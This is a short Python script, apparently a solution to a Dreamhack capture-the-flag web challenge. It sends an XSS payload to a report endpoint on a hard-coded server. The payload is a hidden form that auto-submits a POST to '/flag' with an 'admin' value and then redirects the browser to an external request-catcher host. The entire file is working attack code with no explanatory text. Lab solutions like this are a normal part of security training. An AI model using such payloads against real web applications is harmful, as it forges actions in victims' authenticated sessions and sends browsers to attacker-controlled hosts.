import requests

HOST = "13.125.251.104"
PORT = 12003

PATH_XSS = f"http://{HOST}:{PORT}/xss"
PATH_REPORT = f"http://{HOST}:{PORT}/report"
PATH_FLAG = f"http://{HOST}:{PORT}/flag"

payload = '''
<form name='af' method='post' action='/flag'>
    <input type='hidden' name='admin' value='zzlol'>
</form> 
<script>
    document.af.submit();
    window.location.href='https://bacgsrw.request.dreamhack.games'
</script> 
'''

data = {
    "payload":payload
}

res = requests.post(PATH_REPORT, data=data)
print(res.content)

